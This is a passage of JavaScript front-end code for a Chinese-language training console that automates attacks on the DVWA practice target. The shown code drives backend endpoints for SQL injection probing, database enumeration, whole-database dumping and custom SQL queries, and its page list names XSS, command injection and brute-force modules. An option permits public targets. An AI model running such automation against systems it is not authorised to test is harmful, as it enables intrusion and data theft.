/* ============================================================
   SecLab Console — front-end controller
   ============================================================ */
(() => {
  'use strict';

  const $ = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const esc = (value) => String(value ?? '').replace(/[&<>"']/g, (ch) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[ch]));

  const TECH_LABEL = { boolean: '布尔盲注', error: '报错注入', time: '时间盲注' };
  const REFLECT_LABEL = {
    raw: ['原样反射', 'chip-bad'],
    encoded: ['已编码', 'chip-ok'],
    partial: ['部分改写', 'chip-warn'],
    blocked: ['未反射', 'chip'],
    preexisting: ['页面已存在', 'chip-warn'],
  };
  const SEV_LABEL = { critical: '严重', high: '高危', medium: '中危', info: '信息' };

  const state = {
    page: 'dashboard',
    running: null,
    sqli: { ctx: null, dbs: [], tables: [], fields: [], db: '', table: '', rows: null, probe: null, fingerprint: null, dumpAll: null, blindDump: null },
    xss: { result: null, variant: null, poc: null, selected: new Set(), tab: 'links', mode: 'reflected' },
    cmdi: { best: null, allowAll: false, result: null, lastOutput: '' },
    brute: { taskId: null, total: 0, found: [], target: '' },
    history: [],
    matrix: null,
    batch: null,
    full: null,
  };

  /* ---------------- console ---------------- */
  const consoleBody = $('#consoleBody');
  let logLines = 0;

  function logConsole(level, message) {
    const line = document.createElement('div');
    const time = new Date().toLocaleTimeString('zh-CN', { hour12: false });
    line.className = `cline ${level || 'info'}`;
    line.innerHTML = `<span class="ts">${time}</span><span class="lv">${(level || 'info').toUpperCase()}</span><span class="msg">${esc(message)}</span>`;
    consoleBody.appendChild(line);
    logLines += 1;
    while (logLines > 600) {
      consoleBody.removeChild(consoleBody.firstChild);
      logLines -= 1;
    }
    consoleBody.scrollTop = consoleBody.scrollHeight;
  }

  function setConsoleState(text) {
    $('#consoleState').textContent = text;
    const light = $('#engineText');
    light.textContent = `ENGINE ${text}`;
  }

  function setStep(text) {
    $('#consoleStep').textContent = text ? `· ${text}` : '';
  }

  function setProgress(value) {
    $('#globalBar').style.width = `${Math.max(0, Math.min(1, value)) * 100}%`;
  }

  function toast(message, type = 'info') {
    const el = document.createElement('div');
    el.className = `toast ${type}`;
    el.textContent = message;
    $('#toasts').appendChild(el);
    setTimeout(() => {
      el.style.opacity = '0';
      el.style.transition = 'opacity .3s';
      setTimeout(() => el.remove(), 320);
    }, 3600);
  }

  /* ---------------- api ---------------- */
  async function api(path, body = null, method = null) {
    const options = { method: method || (body ? 'POST' : 'GET'), headers: {} };
    if (body) {
      options.headers['Content-Type'] = 'application/json';
      options.body = JSON.stringify(body);
    }
    let res;
    try {
      res = await fetch(path, options);
    } catch (err) {
      throw new Error('无法连接本地服务，请确认 python app.py 仍在运行');
    }
    const text = await res.text();
    let data = {};
    try {
      data = text ? JSON.parse(text) : {};
    } catch {
      data = { error: text.slice(0, 200) || `HTTP ${res.status}` };
    }
    if (!res.ok) throw new Error(data.error || `请求失败 (HTTP ${res.status})`);
    return data;
  }

  function busy(btn, on, label = '执行中') {
    if (!btn) return;
    if (on) {
      btn.dataset.html = btn.innerHTML;
      btn.disabled = true;
      btn.innerHTML = `<span class="spin"></span>${label}`;
    } else {
      if (btn.dataset.html) btn.innerHTML = btn.dataset.html;
      btn.disabled = false;
    }
  }

  function setRunning(running) {
    state.running = running;
    const stop = $('#consoleStop');
    if (stop) stop.disabled = !running;
  }

  async function runTask(path, body, opts = {}) {
    const btn = opts.btn;
    busy(btn, true, opts.label || '执行中');
    setConsoleState('RUNNING');
    setProgress(0.03);
    try {
      const start = await api(path, body);
      setRunning(start.task_id);
      if (opts.onStart) opts.onStart(start);
      let offset = 0;
      for (;;) {
        const task = await api(`/api/task/${start.task_id}?offset=${offset}`, null, 'GET');
        (task.logs || []).forEach((item) => logConsole(item.level, item.msg));
        offset = task.log_offset;
        setProgress(task.progress);
        setStep(task.step);
        if (opts.onTick) opts.onTick(task);
        if (task.status !== 'running') {
          setRunning(null);
          setConsoleState(task.status.toUpperCase());
          setProgress(0);
          if (task.status === 'error') throw new Error(task.error || '任务执行失败');
          if (task.status === 'stopped') toast('任务已中止', 'warn');
          return task;
        }
        await sleep(320);
      }
    } catch (err) {
      setRunning(null);
      setConsoleState('ERROR');
      setProgress(0);
      logConsole('err', err.message);
      toast(err.message, 'err');
      if (/login\.php|登录页|Cookie/i.test(err.message)) {
        showAuthBanner('刚才的任务被跳转到登录页，Cookie 可能已经失效。');
      }
      throw err;
    } finally {
      busy(btn, false);
      setRunning(null);
    }
  }

  /* ---------------- navigation ---------------- */
  const PAGE_NAME = {
    dashboard: '总览面板', sqli: 'SQL 注入', xss: 'XSS 攻击', cmdi: '命令注入',
    brute: '弱口令爆破', batch: '批量扫描', tasks: '任务中心', history: '任务记录',
    about: '边界与说明',
  };

  function go(page, push = true) {
    if (!PAGE_NAME[page]) page = 'dashboard';
    state.page = page;
    $$('.page').forEach((el) => el.classList.toggle('active', el.id === `page-${page}`));
    $$('.nav-item').forEach((el) => el.classList.toggle('active', el.dataset.page === page));
    $('#crumbPage').textContent = PAGE_NAME[page];
    document.title = `${PAGE_NAME[page]} · SecLab Console`;
    if (push && location.hash !== `#/${page}`) history.replaceState(null, '', `#/${page}`);
    $('#content').scrollTop = 0;
    if (page === 'history') loadHistory();
    if (page === 'tasks') loadTasks();
    if (page === 'dashboard') loadDashboard();
  }

  /* ---------------- persistence ---------------- */
  function initPersist() {
    const version = 'seclab-config-v12';
    if (localStorage.getItem('seclab.configVersion') !== version) {
      Object.keys(localStorage)
        .filter((key) => key.startsWith('seclab.'))
        .forEach((key) => localStorage.removeItem(key));
      localStorage.setItem('seclab.configVersion', version);
    }
    $$('[data-prefix]').forEach((el) => {
      const key = `seclab.${el.dataset.prefix}.${el.dataset.key}`;
      const saved = localStorage.getItem(key);
      if (saved !== null) {
        if (el.type === 'checkbox') el.checked = saved === '1';
        else el.value = saved;
      }
      const event = el.type === 'checkbox' || el.tagName === 'SELECT' ? 'change' : 'input';
      el.addEventListener(event, () => {
        localStorage.setItem(key, el.type === 'checkbox' ? (el.checked ? '1' : '0') : el.value);
      });
    });
  }

  function syncCookie(fromPrefix) {
    const value = $(`#${fromPrefix}Cookie`)?.value || '';
    ['sqli', 'xss', 'cmdi', 'brute'].forEach((prefix) => {
      const input = $(`#${prefix}Cookie`);
      if (input && prefix !== fromPrefix) {
        input.value = value;
        localStorage.setItem(`seclab.${prefix}.cookie`, value);
      }
    });
    toast('Cookie 已同步到其他模块', 'ok');
  }

  /* ---------------- target helpers ---------------- */
  function parseFormData(text) {
    const out = {};
    if (!text) return out;
    new URLSearchParams(String(text).replace(/[\r\n]+/g, '&')).forEach((value, key) => {
      if (key.trim()) out[key.trim()] = value;
    });
    return out;
  }

  function targetOf(prefix) {
    const source = prefix === 'dash' ? 'sqli' : prefix;
    const proxy = localStorage.getItem('seclab.global.proxy') || '';
    const ua = localStorage.getItem('seclab.global.ua') || '';
    const target = {
      url: ($(`#${source}Url`)?.value || '').trim(),
      method: $(`#${source}Method`)?.value || 'GET',
      cookie: ($(`#${source}Cookie`)?.value || '').trim(),
      delay: parseFloat($(`#${source}Delay`)?.value || '0.15') || 0.15,
      allow_public: !!$(`#${source}Public`)?.checked,
      data: parseFormData($(`#${source}Data`)?.value || ''),
      proxy,
      ua,
    };
    if (prefix === 'dash') target.url = ($('#dashUrl')?.value || '').trim();
    return target;
  }

  function urlParams(prefix) {
    const keys = [];
    const url = ($(`#${prefix}Url`)?.value || '').trim();
    try {
      new URL(url).searchParams.forEach((_, key) => keys.push(key));
    } catch { /* ignore malformed url while typing */ }
    Object.keys(parseFormData($(`#${prefix}Data`)?.value || '')).forEach((key) => keys.push(key));
    return [...new Set(keys)];
  }

  const paramUnchecked = {};

  function renderParams(prefix) {
    const box = $(`#${prefix}Params`);
    if (!box) return;
    const keys = urlParams(prefix);
    if (!keys.length) {
      box.innerHTML = '<span class="hint">URL 中的参数会自动解析，也可在探测时手动指定</span>';
      return;
    }
    const unchecked = paramUnchecked[prefix] || new Set();
    box.innerHTML = keys.map((key) => {
      const on = !unchecked.has(key);
      return `<label class="param-chip ${on ? 'on' : ''}">
        <input type="checkbox" value="${esc(key)}" ${on ? 'checked' : ''}>
        <span class="tick"></span>${esc(key)}
      </label>`;
    }).join('');
    $$('input', box).forEach((input) => {
      input.addEventListener('change', () => {
        const set = paramUnchecked[prefix] || (paramUnchecked[prefix] = new Set());
        if (input.checked) set.delete(input.value); else set.add(input.value);
        input.closest('.param-chip').classList.toggle('on', input.checked);
      });
    });
  }

  function selectedParams(prefix) {
    const box = $(`#${prefix}Params`);
    const chips = box ? $$('input[type="checkbox"]', box) : [];
    if (chips.length) {
      return chips.filter((c) => c.checked).map((c) => c.value);
    }
    return urlParams(prefix);
  }

  async function checkTarget(prefix, outEl) {
    const out = typeof outEl === 'string' ? $(outEl) : outEl;
    try {
      if (out) out.innerHTML = '<span class="chip">正在连接目标…</span>';
      const result = await api('/api/target/check', { target: targetOf(prefix) });
      const chips = [
        `<span class="chip ${result.ok ? 'chip-ok' : 'chip-bad'}">HTTP ${result.status}</span>`,
        `<span class="chip">${result.length} 字节</span>`,
        `<span class="chip">${result.elapsed_ms} ms</span>`,
        `<span class="chip chip-cyan">${esc(result.scope)}</span>`,
      ];
      if (result.security) chips.push(`<span class="chip chip-warn">security=${esc(result.security)}</span>`);
      if (result.login_required) chips.push('<span class="chip chip-bad">跳转到登录页 / Cookie 失效</span>');
      if (out) out.innerHTML = chips.join('');
      logConsole(result.ok ? 'ok' : 'warn',
        `目标连通性：HTTP ${result.status} / ${result.length}B / ${result.elapsed_ms}ms / ${result.scope}`);
      if (prefix === 'dash') {
        const stat = $('#statTarget');
        stat.textContent = result.ok ? 'ONLINE' : 'CHECK';
        stat.style.color = result.ok ? 'var(--lime)' : 'var(--amber)';
      }
      return result;
    } catch (err) {
      if (out) out.innerHTML = `<span class="chip chip-bad">${esc(err.message)}</span>`;
      logConsole('err', err.message);
      if (prefix === 'dash') $('#statTarget').textContent = 'OFFLINE';
      return null;
    }
  }

  /* ---------------- dashboard ---------------- */
  async function loadDashboard() {
    try {
      const data = await api('/api/history');
      state.history = data.items || [];
      $('#statTasks').textContent = state.history.length;
      const high = state.history.filter((item) => ['critical', 'high'].includes(item.severity)).length;
      $('#statHigh').textContent = high;
      const rows = state.history.reduce((sum, item) => sum + (item.rows || 0), 0);
      $('#statRows').textContent = rows;
    } catch { /* keep zeros */ }
    const url = $('#dashUrl');
    if (!url.value.trim()) {
      url.value = $('#sqliUrl')?.value || 'http://127.0.0.1/vulnerabilities/sqli/?id=1';
    }
  }

  $('#dashCheck')?.addEventListener('click', async (event) => {
    const btn = event.currentTarget;
    busy(btn, true, '检测中');
    try {
      await checkTarget('dash', '#dashResult');
    } finally {
      busy(btn, false);
    }
  });

  $('#dashRegress')?.addEventListener('click', async (event) => {
    const targets = {
      sqli: targetOf('sqli'),
      xss: targetOf('xss'),
      cmdi: targetOf('cmdi'),
      brute: targetOf('brute'),
    };
    const missing = Object.entries(targets).filter(([, cfg]) => !cfg.url).map(([key]) => key);
    if (missing.length === Object.keys(targets).length) {
      toast('四个模块都还没有目标地址', 'warn');
      return;
    }
    const out = $('#dashRegressOut');
    out.innerHTML = '<div class="empty">回归执行中，进度见下方控制台…</div>';
    try {
      const task = await runTask('/api/regress', { targets }, { btn: event.currentTarget, label: '回归中' });
      renderRegress(task.result || {});
      const result = task.result || {};
      toast(`回归完成：${result.passed} 通过 / ${result.failed} 失败`,
        result.failed ? 'warn' : 'ok');
    } catch {
      out.innerHTML = '<div class="empty">回归失败，请查看控制台日志</div>';
    }
  });

  const STATE_LABEL = { ok: ['通过', 'chip-ok'], warn: ['警告', 'chip-warn'], fail: ['失败', 'chip-bad'], skip: ['跳过', 'chip'] };

  function renderRegress(result) {
    const rows = result.rows || [];
    const out = $('#dashRegressOut');
    if (!rows.length) { out.innerHTML = '<div class="empty">没有结果</div>'; return; }
    const body = rows.map((row) => {
      const [label, cls] = STATE_LABEL[row.state] || [row.state, 'chip'];
      return `<tr>
        <td>${esc(row.module)}</td>
        <td><span class="chip ${cls}">${label}</span></td>
        <td class="mono">${esc(row.detail)}</td>
        <td class="num-cell">${row.elapsed}s</td>
        <td class="num-cell">${row.requests || '-'}</td>
      </tr>`;
    }).join('');
    out.innerHTML = `<div class="inline-out">
        <span class="chip chip-ok">通过 ${result.passed || 0}</span>
        <span class="chip chip-warn">警告 ${result.warned || 0}</span>
        <span class="chip chip-bad">失败 ${result.failed || 0}</span>
      </div>
      <table><thead><tr><th>模块</th><th>状态</th><th>结论</th><th>耗时</th><th>请求</th></tr></thead>
      <tbody>${body}</tbody></table>`;
  }

  /* ---------------- 难度矩阵 ---------------- */
  const MATRIX_LEVEL = { low: 'LOW', medium: 'MEDIUM', high: 'HIGH' };

  $('#matrixRun')?.addEventListener('click', async (event) => {
    const targets = { sqli: targetOf('sqli'), xss: targetOf('xss'), cmdi: targetOf('cmdi') };
    if (!Object.values(targets).some((cfg) => cfg.url)) {
      toast('请先在 SQL / XSS / 命令注入页填写目标地址', 'warn');
      return;
    }
    const out = $('#matrixOut');
    out.innerHTML = '<div class="empty">矩阵生成中，进度见下方控制台…</div>';
    try {
      const task = await runTask('/api/matrix', { targets },
        { btn: event.currentTarget, label: '生成中' });
      renderMatrix(task.result || {});
      const result = task.result || {};
      S.matrix = result;
      $('#matrixExport').disabled = !(result.modules || []).length;
      toast(`矩阵完成：${result.passed}/${result.total} 组合可用`, 'ok');
    } catch {
      out.innerHTML = '<div class="empty">生成失败，请查看控制台日志</div>';
    }
  });

  $('#matrixExport')?.addEventListener('click', () => {
    const result = S.matrix;
    if (!result?.modules?.length) { toast('先生成一次矩阵', 'warn'); return; }
    const levels = result.levels || [];
    let md = reportHead('难度矩阵对比', 'SQL / XSS / 命令注入');
    md += `## 结果总览\n\n- 组合：${result.total} 个，可用 ${result.passed} 个\n\n`;
    md += mdTable(['模块', ...levels.map((lv) => MATRIX_LEVEL[lv] || lv)],
      result.modules.map((mod) => [mod.label,
        ...levels.map((lv) => {
          const cell = mod.cells?.[lv] || {};
          const mark = cell.state === 'ok' ? '✅' : cell.state === 'warn' ? '⚠️' : '⛔';
          return `${mark} ${cell.short || '-'}`;
        })])) + '\n\n';
    md += '## 各档细节\n\n';
    for (const mod of result.modules) {
      md += `### ${mod.label}\n\n`;
      for (const lv of levels) {
        const cell = mod.cells?.[lv] || {};
        md += `- **${(MATRIX_LEVEL[lv] || lv)}**：${cell.detail || '-'}\n`;
      }
      md += '\n';
    }
    download('seclab-matrix.md', md, 'text/markdown');
    toast('难度矩阵已导出', 'ok');
  });

  function renderMatrix(result) {
    const levels = result.levels || [];
    const modules = result.modules || [];
    const out = $('#matrixOut');
    if (!modules.length) { out.innerHTML = '<div class="empty">没有结果</div>'; return; }
    const head = `<th>模块</th>${levels.map((lv) => `<th>${MATRIX_LEVEL[lv] || lv}</th>`).join('')}`;
    const body = modules.map((mod) => {
      const cells = levels.map((lv) => {
        const cell = mod.cells?.[lv] || {};
        const cls = cell.state === 'ok' ? 'mx-ok' : cell.state === 'warn' ? 'mx-warn' : 'mx-bad';
        return `<td class="${cls}" title="${esc(cell.detail || '')}">${esc(cell.short || '-')}</td>`;
      }).join('');
      return `<tr><td>${esc(mod.label)}</td>${cells}</tr>`;
    }).join('');
    out.innerHTML = `<table class="matrix"><thead><tr>${head}</tr></thead><tbody>${body}</tbody></table>
      <p class="hint" style="margin:8px 2px 0">绿色=有可用注入点，黄色=部分可用，红色=该档被阻断；悬停单元格可看完整结论。</p>`;
  }

  $('#dashDefaults')?.addEventListener('click', () => {
    $('#dashUrl').value = 'http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit';
    toast('已填入 DVWA 默认地址', 'ok');
  });

  /* ---------------- SQLI ---------------- */
  const S = state.sqli;

  function renderCtx() {
    const ctx = S.ctx;
    const bar = $('#sqliCtx');
    if (!ctx) {
      bar.innerHTML = '<span class="hint">尚未建立注入上下文 · 建议先执行「一键全自动」或「仅探测注入点」</span>';
      return;
    }
    const quoteText = { "'": '单引号', '"': '双引号', '': '数字型' }[ctx.quote] ?? ctx.quote;
    const chips = [
      ['参数', ctx.param],
      ['类型', quoteText],
      ['注释', ctx.suffix],
      ['列数', ctx.columns || '—'],
      ['回显列', ctx.display || '—'],
    ];
    bar.innerHTML = chips.map(([k, v]) => `<span><span class="k">${k}</span> <span class="v">${esc(v)}</span></span>`).join('<span class="k">/</span>');
  }

  function renderFindings(probe) {
    const box = $('#sqliFindings');
    if (!probe) { box.innerHTML = ''; return; }
    if (!probe.vulnerable) {
      box.innerHTML = `<div class="finding">
        <div class="finding-top"><span class="chip chip-warn">NOT FOUND</span><strong>未确认可用注入点</strong></div>
        <p class="hint">检查参数名、Cookie 是否有效、靶场安全级别；也可以先点「连接测试」确认响应正常。</p>
      </div>`;
      return;
    }
    box.innerHTML = probe.findings.map((item) => {
      const evidence = Object.entries(item.evidence || {})
        .map(([k, v]) => `<div><span class="k">${esc(k)}</span><span class="v">${esc(v)}</span></div>`).join('');
      return `<div class="finding hot">
        <div class="finding-top">
          <span class="chip chip-mag">${esc(TECH_LABEL[item.technique] || item.technique)}</span>
          <strong>参数 ${esc(item.param)}</strong>
          <span class="chip">${{ "'": '单引号', '"': '双引号', '': '数字型' }[item.quote]}</span>
          <span class="chip">注释 ${esc(item.suffix)}</span>
        </div>
        <pre>${esc(item.payload)}</pre>
        <div class="kv">${evidence}</div>
      </div>`;
    }).join('');
  }

  function renderFingerprint(info) {
    S.fingerprint = info;
    const rows = Object.entries(info)
      .filter(([key]) => key !== 'summary' && key !== 'severity')
      .map(([key, value]) => `<div><span class="k">${esc(key)}</span><span class="v">${esc(value)}</span></div>`).join('');
    const card = document.createElement('div');
    card.className = 'finding';
    card.innerHTML = `<div class="finding-top"><span class="chip chip-cyan">FINGERPRINT</span><strong>数据库指纹</strong></div><div class="kv">${rows}</div>`;
    $('#sqliFindings').appendChild(card);
  }

  function renderDatabases(dbs) {
    S.dbs = dbs || [];
    $('#sqliDbCount').textContent = S.dbs.length ? `${S.dbs.length}` : '';
    const box = $('#sqliDbList');
    if (!S.dbs.length) {
      box.innerHTML = '<div class="empty sm">未枚举到数据库</div>';
      return;
    }
    box.innerHTML = S.dbs.map((db) => `<button class="list-item" data-db="${esc(db)}">
      <svg class="ico"><use href="#i-db"/></svg>${esc(db)}</button>`).join('');
    $$('.list-item', box).forEach((item) => item.addEventListener('click', () => loadTables(item.dataset.db)));
  }

  async function loadTables(database) {
    S.db = database;
    S.table = '';
    S.fields = [];
    $$('#sqliDbList .list-item').forEach((el) => el.classList.toggle('active', el.dataset.db === database));
    $('#sqliTableList').innerHTML = '<div class="empty sm">加载中…</div>';
    $('#sqliFieldList').innerHTML = '<div class="empty sm">选择数据表</div>';
    $('#sqliDump').disabled = true;
    try {
      const result = await runTask('/api/sqli/tables', { target: targetOf('sqli'), inject: S.ctx, database }, { label: '枚举中' });
      S.tables = result.result?.items || [];
      $('#sqliTableCount').textContent = S.tables.length ? `${S.tables.length}` : '';
      const box = $('#sqliTableList');
      box.innerHTML = S.tables.length
        ? S.tables.map((table) => `<button class="list-item" data-table="${esc(table)}">
            <svg class="ico"><use href="#i-grid"/></svg>${esc(table)}</button>`).join('')
        : '<div class="empty sm">没有表</div>';
      $$('.list-item', box).forEach((item) => item.addEventListener('click', () => loadFields(item.dataset.table)));
      updateDumpButton();
    } catch (err) {
      $('#sqliTableList').innerHTML = `<div class="empty sm">${esc(err.message)}</div>`;
    }
  }

  async function loadFields(table) {
    S.table = table;
    $$('#sqliTableList .list-item').forEach((el) => el.classList.toggle('active', el.dataset.table === table));
    $('#sqliFieldList').innerHTML = '<div class="empty sm">加载中…</div>';
    try {
      const result = await runTask('/api/sqli/fields',
        { target: targetOf('sqli'), inject: S.ctx, database: S.db, table }, { label: '枚举中' });
      S.fields = result.result?.items || [];
      $('#sqliFieldCount').textContent = S.fields.length ? `${S.fields.length}` : '';
      const box = $('#sqliFieldList');
      box.innerHTML = S.fields.length
        ? S.fields.map((field) => `<label class="field-check"><input type="checkbox" value="${esc(field)}" checked>${esc(field)}</label>`).join('')
        : '<div class="empty sm">没有字段</div>';
      $$('input', box).forEach((input) => input.addEventListener('change', updateDumpButton));
      updateDumpButton();
    } catch (err) {
      $('#sqliFieldList').innerHTML = `<div class="empty sm">${esc(err.message)}</div>`;
    }
  }

  function updateDumpButton() {
    const checked = $$('#sqliFieldList input:checked').length;
    $('#sqliDump').disabled = !(S.db && S.table && checked && S.ctx?.display);
    $('#sqliDumpAll').disabled = !(S.db && S.ctx?.display);
  }

  function renderDataTable(columns, rows) {
    if (!rows?.length) {
      $('#sqliData').innerHTML = '<div class="empty">没有数据</div>';
      return;
    }
    $('#sqliData').innerHTML = tableMarkup(columns, rows);
  }

  function tableMarkup(columns, rows) {
    const head = columns.map((col) => `<th>${esc(col)}</th>`).join('');
    const body = rows.map((row, index) => {
      const cells = columns.map((col) => {
        const value = row[col] ?? '';
        return `<td class="mono" title="${esc(value)}">${esc(String(value).slice(0, 160))}</td>`;
      }).join('');
      return `<tr><td class="num-cell">${index + 1}</td>${cells}</tr>`;
    }).join('');
    return `<table><thead><tr><th class="num">#</th>${head}</tr></thead><tbody>${body}</tbody></table>`;
  }

  function renderAllTables(result) {
    const parts = (result.tables || []).map((item) => {
      const head = `<div class="exp-title" style="padding:12px 2px 6px;border:none">
        <span>${esc(item.table)}</span><span>${item.rows.length} / ${item.total_rows ?? item.rows.length} 行</span></div>`;
      return head + (item.rows.length ? tableMarkup(item.columns, item.rows)
        : '<div class="empty sm">无数据</div>');
    }).join('<div class="divider"></div>');
    $('#sqliData').innerHTML = parts || '<div class="empty">没有数据</div>';
  }

  async function sqliStep(path, extra, btn, label, onDone) {
    if (!S.ctx) { toast('请先建立注入上下文', 'warn'); return; }
    try {
      const task = await runTask(path, { target: targetOf('sqli'), inject: S.ctx, ...extra }, { btn, label });
      if (onDone && task.result) onDone(task.result);
    } catch { /* handled in runTask */ }
  }

  $('#sqliAuto')?.addEventListener('click', async (event) => {
    let params = selectedParams('sqli');
    if (!params.length) { params = ['id']; toast('未解析到参数，默认使用 id', 'warn'); }
    if (!params.length) { toast('请先选择至少一个参数', 'warn'); return; }
    try {
      const task = await runTask('/api/sqli/auto', { target: targetOf('sqli'), params },
        { btn: event.currentTarget, label: '全自动中' });
      const result = task.result || {};
      renderFindings(result.probe);
      S.probe = result.probe || null;
      if (result.mode === 'blind' && result.stage?.blind) {
        S.ctx = { ...(result.inject || {}) };
        renderCtx();
        const blind = result.stage.blind;
        const card = document.createElement('div');
        card.className = 'finding hot';
        card.innerHTML = `<div class="finding-top"><span class="chip chip-mag">BLIND</span>
          <strong>UNION 不可用，已自动降级盲注</strong></div>
          <pre>${esc(blind.expression)} = ${esc(blind.value)}</pre>
          <div class="kv">
            <div><span class="k">请求数</span><span class="v">${blind.requests}</span></div>
            <div><span class="k">模式</span><span class="v">${esc(blind.mode)}</span></div>
          </div>`;
        $('#sqliFindings').appendChild(card);
        toast('UNION 流程失败，已用盲注提取 VERSION()', 'warn');
        return;
      }
      if (!result.inject) {
        S.ctx = result.probe?.best ? { ...result.probe.best } : null;
        renderCtx();
        toast('未确认注入点，可查看控制台日志', 'warn');
        return;
      }
      S.ctx = result.inject;
      renderCtx();
      if (result.stage?.fingerprint) renderFingerprint(result.stage.fingerprint);
      renderDatabases(result.stage?.databases || []);
      toast('全自动完成：注入点已确认，数据库已列出', 'ok');
    } catch { /* handled */ }
  });

  $('#sqliProbe')?.addEventListener('click', async (event) => {
    let params = selectedParams('sqli');
    if (!params.length) { params = ['id']; toast('未解析到参数，默认使用 id', 'warn'); }
    if (!params.length) { toast('请先选择至少一个参数', 'warn'); return; }
    try {
      const task = await runTask('/api/sqli/probe', { target: targetOf('sqli'), params },
        { btn: event.currentTarget, label: '探测中' });
      const result = task.result || {};
      renderFindings(result);
      S.probe = result;
      S.ctx = result.best ? { ...result.best } : null;
      renderCtx();
      if (result.best) toast('已建立注入上下文，可继续列数探测', 'ok');
    } catch { /* handled */ }
  });

  $('#sqliColumns')?.addEventListener('click', (event) => {
    sqliStep('/api/sqli/columns', {}, event.currentTarget, '探测中', (result) => {
      S.ctx.columns = result.columns;
      renderCtx();
      toast(`列数：${result.columns}`, 'ok');
    });
  });

  $('#sqliDisplay')?.addEventListener('click', (event) => {
    if (!S.ctx?.columns) { toast('请先探测列数', 'warn'); return; }
    sqliStep('/api/sqli/display', {}, event.currentTarget, '定位中', (result) => {
      S.ctx.display = result.display;
      renderCtx();
      toast(`回显列：第 ${result.display} 列`, 'ok');
    });
  });

  $('#sqliFingerprint')?.addEventListener('click', (event) => {
    if (!S.ctx?.display) { toast('请先定位回显列', 'warn'); return; }
    sqliStep('/api/sqli/fingerprint', {}, event.currentTarget, '读取中', renderFingerprint);
  });

  $('#sqliDatabases')?.addEventListener('click', (event) => {
    if (!S.ctx?.display) { toast('请先定位回显列', 'warn'); return; }
    sqliStep('/api/sqli/databases', {}, event.currentTarget, '枚举中', (result) => {
      renderDatabases(result.items || []);
      toast(`枚举到 ${(result.items || []).length} 个数据库`, 'ok');
    });
  });

  $('#sqliDump')?.addEventListener('click', async (event) => {
    const fields = $$('#sqliFieldList input:checked').map((input) => input.value);
    if (!fields.length) { toast('请至少选择一个字段', 'warn'); return; }
    try {
      const task = await runTask('/api/sqli/dump', {
        target: targetOf('sqli'), inject: S.ctx, database: S.db, table: S.table,
        fields, limit: parseInt($('#sqliLimit').value, 10) || 10,
      }, { btn: event.currentTarget, label: '导出中' });
      const result = task.result || {};
      S.rows = result;
      S.dumpAll = null;
      S.view = { columns: result.columns || fields, rows: result.rows || [] };
      renderDataTable(result.columns || fields, result.rows || []);
      $('#sqliFilter').disabled = false;
      $('#sqliFilter').value = '';
      $('#sqliExportJson').disabled = !(result.rows || []).length;
      $('#sqliExportCsv').disabled = !(result.rows || []).length;
      toast(`已导出 ${(result.rows || []).length} 行`, 'ok');
    } catch { /* handled */ }
  });

  $('#sqliFilter')?.addEventListener('input', (event) => {
    if (!S.view) return;
    const keyword = event.target.value.trim().toLowerCase();
    const rows = keyword
      ? S.view.rows.filter((row) => S.view.columns.some(
        (col) => String(row[col] ?? '').toLowerCase().includes(keyword)))
      : S.view.rows;
    $('#sqliData').innerHTML = rows.length
      ? tableMarkup(S.view.columns, rows)
      : '<div class="empty">没有匹配的行</div>';
  });

  $('#sqliDumpAll')?.addEventListener('click', async (event) => {
    if (!S.ctx?.display || !S.db) { toast('请先选择数据库', 'warn'); return; }
    try {
      const task = await runTask('/api/sqli/dump_all', {
        target: targetOf('sqli'), inject: S.ctx, database: S.db,
        limit: parseInt($('#sqliLimit').value, 10) || 10,
      }, { btn: event.currentTarget, label: '整库导出' });
      const result = task.result || {};
      S.dumpAll = result;
      S.view = null;
      renderAllTables(result);
      $('#sqliFilter').disabled = true;
      $('#sqliFilter').value = '';
      $('#sqliExportJson').disabled = false;
      $('#sqliExportCsv').disabled = true;
      toast(`整库导出完成：${result.tables.length} 张表 / ${result.total_rows} 行`, 'ok');
    } catch { /* handled */ }
  });

  $('#sqliExportJson')?.addEventListener('click', () => {
    const payload = S.dumpAll || S.rows;
    if (!payload) return;
    const name = S.dumpAll ? `sqli-${S.dumpAll.database}-all.json`
      : `sqli-${S.rows.database}-${S.rows.table}.json`;
    download(name, JSON.stringify(payload, null, 2), 'application/json');
  });

  $('#sqliExportCsv')?.addEventListener('click', () => {
    if (!S.rows?.rows?.length) return;
    download(`sqli-${S.rows.database}-${S.rows.table}.csv`,
      toCsv(S.rows.columns, S.rows.rows), 'text/csv;charset=utf-8');
  });

  $('#sqliCustomRun')?.addEventListener('click', async (event) => {
    const expr = $('#sqliExpr').value.trim();
    if (!expr) { toast('请输入 SQL 表达式', 'warn'); return; }
    if (!S.ctx?.display) { toast('请先定位回显列', 'warn'); return; }
    try {
      const task = await runTask('/api/sqli/custom',
        { target: targetOf('sqli'), inject: S.ctx, expr }, { btn: event.currentTarget, label: '执行中' });
      const value = task.result?.value;
      $('#sqliCustomOut').innerHTML = value === null || value === undefined
        ? '<span class="chip chip-bad">无返回</span>'
        : `<span class="chip chip-cyan">RESULT</span><pre>${esc(value)}</pre>`;
    } catch { /* handled */ }
  });

  $('#sqliCheck')?.addEventListener('click', (event) => {
    const btn = event.currentTarget;
    busy(btn, true, '检测中');
    checkTarget('sqli', '#sqliCheckOut').finally(() => busy(btn, false));
  });
  $('#sqliSync')?.addEventListener('click', () => syncCookie('sqli'));

  function applyDetectedForm(form) {
    $('#sqliMethod').value = form.method;
    $('#sqliUrl').value = form.action;
    const textarea = $('#sqliData');
    textarea.value = new URLSearchParams(form.fields).toString();
    textarea.closest('details').open = true;
    textarea.dispatchEvent(new Event('change', { bubbles: true }));
    renderParams('sqli');
    toast(`已应用 ${form.method} 表单：${form.names.join(', ')}`, 'ok');
  }

  $('#sqliForm')?.addEventListener('click', async (event) => {
    const params = selectedParams('sqli');
    try {
      const task = await runTask('/api/form/detect',
        { target: targetOf('sqli'), param: params[0] || '' },
        { btn: event.currentTarget, label: '识别中' });
      const forms = task.result?.forms || [];
      const box = $('#sqliFormBox');
      if (!forms.length) {
        box.innerHTML = '<span class="chip chip-warn">未识别到可用表单（可能是纯 API 或页面需登录）</span>';
        return;
      }
      box.innerHTML = forms.map((form, index) => `<div class="form-card">
        <div class="row between wrap">
          <span class="chip chip-cyan">${esc(form.method)}</span>
          <span class="code-inline">${esc(form.action)}</span>
        </div>
